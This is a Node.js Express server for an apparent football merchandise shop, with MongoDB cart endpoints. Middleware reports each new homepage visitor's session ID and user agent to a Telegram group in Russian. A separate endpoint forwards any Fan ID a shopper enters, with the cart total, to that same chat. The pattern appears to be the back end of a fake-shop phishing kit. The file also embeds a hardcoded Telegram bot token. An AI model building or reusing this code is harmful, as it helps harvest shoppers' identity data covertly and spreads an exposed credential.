const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const fetch = require('node-fetch');
const app = express();

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8255465313:AAHVAtXJ6fIdyZfuvDq0PNjv06UyLwy5h9Q';
const TELEGRAM_CHAT_ID = '-1003198740447';

async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API error:', data);
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
}
const PORT = process.env.PORT || 3000;

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/football-cart';

mongoose.connect(MONGODB_URI).then(() => {
  console.log('✅ Connected to MongoDB');
}).catch(err => {
  console.error('❌ MongoDB connection error:', err);
});

// Cart Schema
const cartSchema = new mongoose.Schema({
  sessionId: { type: String, required: true, unique: true },
  items: [{
    id: String,
    title: String,
    category: String,
    price: Number,
    quantity: Number,
    image: String
  }],
  notificationSent: { type: Boolean, default: false },
  updatedAt: { type: Date, default: Date.now }
});

const Cart = mongoose.model('Cart', cartSchema);

// Middleware
app.use(express.json());

// Track page visits - send notification only once per session on homepage
app.use(async (req, res, next) => {
  // Only track homepage visits (index.html or root path)
  const isHomepage = req.path === '/' || req.path === '/index.html' || req.path === '';
  
  if (isHomepage) {
    const sessionId = req.headers['x-session-id'];
    
    if (sessionId && sessionId !== 'unknown') {
      try {
        // Check if notification was already sent for this session
        let cart = await Cart.findOne({ sessionId: sessionId });
        
        if (!cart) {
          // Create new cart entry
          cart = await Cart.create({ sessionId: sessionId, items: [], notificationSent: false });
        }
        
        // Send notification only if not sent before
        if (!cart.notificationSent) {
          const userAgent = req.headers['user-agent'] || 'unknown';
          const timestamp = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
          
          const message = `🟢 ПОЛЬЗОВАТЕЛЬ ЗАШЁЛ НА САЙТ\n\n👤 ID: ${sessionId}\n🕐 Время: ${timestamp}\n📱 User Agent: ${userAgent}`;
          sendTelegramMessage(message).catch(err => console.error('Telegram notification failed:', err));
          
          // Mark notification as sent
          cart.notificationSent = true;
          await cart.save();
        }
      } catch (error) {
        console.error('Error tracking page visit:', error);
      }
    }
  }
  next();
});

app.use(express.static('.', {
  extensions: ['html'],
  index: 'index.html'
}));

// API Routes
app.get('/api/cart/:sessionId', async (req, res) => {
  try {
    let cart = await Cart.findOne({ sessionId: req.params.sessionId });
    if (!cart) {
      cart = await Cart.create({ sessionId: req.params.sessionId, items: [] });
    }
    res.json({ success: true, cart: cart.items });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/cart/:sessionId/add', async (req, res) => {
  try {
    const { id, title, category, price, quantity, image } = req.body;
    let cart = await Cart.findOne({ sessionId: req.params.sessionId });
    if (!cart) {
      cart = await Cart.create({ sessionId: req.params.sessionId, items: [] });
    }
    const existingItemIndex = cart.items.findIndex(item => item.id === id);
    if (existingItemIndex >= 0) {
      cart.items[existingItemIndex].quantity += quantity;
    } else {
      cart.items.push({ id, title, category, price, quantity, image });
    }
    cart.updatedAt = new Date();
    await cart.save();
    res.json({ success: true, cart: cart.items });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.put('/api/cart/:sessionId/update/:itemId', async (req, res) => {
  try {
    const { quantity } = req.body;
    const cart = await Cart.findOne({ sessionId: req.params.sessionId });
    if (!cart) {
      return res.status(404).json({ success: false, error: 'Cart not found' });
    }
    const item = cart.items.find(i => i.id === req.params.itemId);
    if (item) {
      item.quantity = Math.max(1, parseInt(quantity) || 1);
      cart.updatedAt = new Date();
      await cart.save();
    }
    res.json({ success: true, cart: cart.items });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.delete('/api/cart/:sessionId/remove/:itemId', async (req, res) => {
  try {
    const cart = await Cart.findOne({ sessionId: req.params.sessionId });
    if (!cart) {
      return res.status(404).json({ success: false, error: 'Cart not found' });
    }
    cart.items = cart.items.filter(item => item.id !== req.params.itemId);
    cart.updatedAt = new Date();
    await cart.save();
    res.json({ success: true, cart: cart.items });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.delete('/api/cart/:sessionId', async (req, res) => {
  try {
    await Cart.findOneAndUpdate(
      { sessionId: req.params.sessionId },
      { items: [], updatedAt: new Date() }
    );
    res.json({ success: true, cart: [] });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('*', (req, res) => {
  if (path.extname(req.path)) {
    return res.status(404).send('File not found');
  }
  
  const requestedPath = req.path;
  
  // Check if it's a collection page
  if (requestedPath.startsWith('/collections/')) {
    const fileName = requestedPath.replace('/collections/', '') + '.html';
    const filePath = path.join(__dirname, 'collections', fileName);
    return res.sendFile(filePath, (err) => {
      if (err) {
        res.sendFile(path.join(__dirname, 'index.html'));
      }
    });
  }
  
  // Check if it's a product page
  if (requestedPath.startsWith('/products/')) {
    const fileName = requestedPath.replace('/products/', '') + '.html';
    const filePath = path.join(__dirname, 'products', fileName);
    return res.sendFile(filePath, (err) => {
      if (err) {
        res.sendFile(path.join(__dirname, 'index.html'));
      }
    });
  }
  
  // Check if it's an order page
  if (requestedPath.startsWith('/order/')) {
    const fileName = requestedPath.replace('/order/', '') + '.html';
    const filePath = path.join(__dirname, 'order', fileName);
    return res.sendFile(filePath, (err) => {
      if (err) {
        res.sendFile(path.join(__dirname, 'index.html'));
      }
    });
  }
  
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

// Fan ID notification endpoint
app.post('/api/notify/fanid', async (req, res) => {
  try {
    const { sessionId, fanId, cartTotal } = req.body;
    const timestamp = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
    
    const message = `✅ Fan ID введён.\n   🟡ID: ${sessionId}\n   🟡Fan ID: ${fanId}\n   🟡 Сумма корзины: $${cartTotal.toFixed(2)}`;
    await sendTelegramMessage(message);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error sending Fan ID notification:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});
